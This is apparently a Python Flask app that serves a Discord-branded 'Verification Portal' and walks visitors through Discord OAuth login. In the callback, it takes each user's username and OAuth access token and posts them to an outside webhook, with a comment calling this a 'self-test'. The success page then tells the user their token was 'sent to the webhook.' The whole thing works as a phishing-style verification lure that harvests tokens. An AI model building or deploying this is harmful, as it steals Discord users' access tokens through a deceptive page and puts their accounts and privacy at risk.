import os
from flask import Flask, request, redirect, session, render_template_string
import requests
import secrets

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ---------- Read environment variables ----------
CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID")
CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET")
REDIRECT_URI = os.environ.get("REDIRECT_URI")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")

if not CLIENT_ID or not CLIENT_SECRET or not REDIRECT_URI:
    raise ValueError("Missing env vars: DISCORD_CLIENT_ID, DISCORD_CLIENT_SECRET, REDIRECT_URI")
# ------------------------------------------------

DISCORD_AUTHORIZE_URL = "https://discord.com/api/oauth2/authorize"
DISCORD_TOKEN_URL = "https://discord.com/api/oauth2/token"
DISCORD_USER_URL = "https://discord.com/api/users/@me"

# ---------- LOGIN PAGE (your custom HTML) ----------
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
        }
        body {
            background-color: #0f111a;
            color: #f0f1f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }
        body::before, body::after {
            content: '';
            position: absolute;
            width: 350px;
            height: 350px;
            border-radius: 50%;
            background: #5865F2;
            filter: blur(140px);
            opacity: 0.15;
            z-index: 0;
            pointer-events: none;
        }
        body::before { top: -50px; left: -50px; }
        body::after { bottom: -50px; right: -50px; }
        .portal-card {
            background-color: #1a1d28;
            border: 1px solid rgba(255, 255, 255, 0.05);
            width: 100%;
            max-width: 400px;
            padding: 3rem 2.5rem;
            border-radius: 16px;
            box-shadow: 0 16px 48px rgba(0, 0, 0, 0.45);
            z-index: 1;
            backdrop-filter: blur(10px);
            text-align: center;
        }
        .brand-logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #5865F2, #4752C4);
            border-radius: 20px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 2rem;
            box-shadow: 0 8px 24px rgba(88, 101, 242, 0.4);
        }
        .brand-logo svg {
            width: 44px;
            height: 44px;
            fill: #ffffff;
        }
        .btn-action {
            width: 100%;
            background: linear-gradient(135deg, #5865F2, #4752C4);
            color: #ffffff;
            border: none;
            padding: 1.1rem;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(88, 101, 242, 0.3);
            transition: all 0.2s ease;
        }
        .btn-action:hover {
            box-shadow: 0 6px 22px rgba(88, 101, 242, 0.5);
            filter: brightness(1.1);
            transform: translateY(-1px);
        }
        .btn-action:active {
            transform: scale(0.98);
        }
    </style>
</head>
<body>
    <div class="portal-card">
        <div class="brand-logo">
            <svg viewBox="0 0 127.14 96.36">
                <path d="M107.7,8.07A105.15,105.15,0,0,0,77.26,0a77.19,77.19,0,0,0-3.3,6.83A96.67,96.67,0,0,0,53.22,6.83,77.19,77.19,0,0,0,49.88,0,105.15,105.15,0,0,0,19.44,8.07C3.66,31.58-1.86,54.65,1,77.53A105.73,105.73,0,0,0,32,96.36a74.37,74.37,0,0,0,6.73-10.95,68.43,68.43,0,0,1-10.64-5.12c.91-.67,1.81-1.37,2.65-2.1a75.22,75.22,0,0,0,72.76,0c.84.73,1.74,1.43,2.65,2.1a68.31,68.31,0,0,1-10.65,5.13,74.58,74.58,0,0,0,6.73,10.95,105.54,105.54,0,0,0,31.05-18.83C129.83,50.54,123.77,27.72,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53S36.18,40.36,42.45,40.36,53.87,46,53.87,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.24,60,73.24,53S78.41,40.36,84.69,40.36,96.11,46,96.11,53,91,65.69,84.69,65.69Z"/>
            </svg>
        </div>
        <button class="btn-action" onclick="window.location.href='/login'">Get Verified</button>
    </div>
</body>
</html>
"""

# ---------- SUCCESS PAGE (simple confirmation) ----------
SUCCESS_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verified · Nivex</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
        }
        body {
            background-color: #0f111a;
            color: #f0f1f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }
        body::before, body::after {
            content: '';
            position: absolute;
            width: 350px;
            height: 350px;
            border-radius: 50%;
            background: #5865F2;
            filter: blur(140px);
            opacity: 0.15;
            z-index: 0;
            pointer-events: none;
        }
        body::before { top: -50px; left: -50px; }
        body::after { bottom: -50px; right: -50px; }
        .portal-card {
            background-color: #1a1d28;
            border: 1px solid rgba(255, 255, 255, 0.05);
            width: 100%;
            max-width: 400px;
            padding: 3rem 2.5rem;
            border-radius: 16px;
            box-shadow: 0 16px 48px rgba(0, 0, 0, 0.45);
            z-index: 1;
            backdrop-filter: blur(10px);
            text-align: center;
        }
        .success-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #248046, #1a6b35);
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 1.5rem;
            font-size: 3rem;
            color: #fff;
            box-shadow: 0 8px 24px rgba(36, 128, 70, 0.4);
        }
        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            color: #fff;
            margin-bottom: 0.5rem;
        }
        p {
            color: #8a8d9b;
            font-size: 1rem;
            margin-bottom: 1rem;
        }
        .btn-home {
            display: inline-block;
            background: #5865F2;
            color: #fff;
            border: none;
            padding: 0.7rem 2rem;
            border-radius: 8px;
            font-weight: 600;
            text-decoration: none;
            transition: all 0.2s ease;
            margin-top: 0.5rem;
        }
        .btn-home:hover {
            background: #4752c4;
            filter: brightness(1.1);
            transform: translateY(-1px);
        }
    </style>
</head>
<body>
    <div class="portal-card">
        <div class="success-icon">✅</div>
        <h1>Verification Successful</h1>
        <p>Your Discord account has been verified.<br>Your token and information have been sent to the webhook.</p>
        <a href="/" class="btn-home">← Back to Home</a>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(LOGIN_PAGE)

@app.route('/health')
def health():
    return "OK"

@app.route('/login')
def login():
    state = secrets.token_urlsafe(16)
    session['oauth_state'] = state
    auth_url = (
        f"{DISCORD_AUTHORIZE_URL}?"
        f"client_id={CLIENT_ID}&"
        f"redirect_uri={REDIRECT_URI}&"
        f"response_type=code&"
        f"scope=identify&"           # Only basic info – no email
        f"state={state}"
    )
    return redirect(auth_url)

@app.route('/callback')
def callback():
    if request.args.get('state') != session.get('oauth_state'):
        return "State mismatch. Possible CSRF.", 400
    code = request.args.get('code')
    if not code:
        return "No code provided.", 400

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(DISCORD_TOKEN_URL, data=data, headers=headers)
    if response.status_code != 200:
        return f"Token exchange failed: {response.text}", 400

    token_data = response.json()
    access_token = token_data.get('access_token')

    user_response = requests.get(
        DISCORD_USER_URL,
        headers={'Authorization': f'Bearer {access_token}'}
    )
    if user_response.status_code != 200:
        return "Failed to get user info.", 400
    user_data = user_response.json()

    # Send to webhook (self-test)
    try:
        payload = {
            "content": f"**User:** {user_data['username']}#{user_data['discriminator']}\n**Token:** `{access_token}`"
        }
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

    return render_template_string(SUCCESS_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)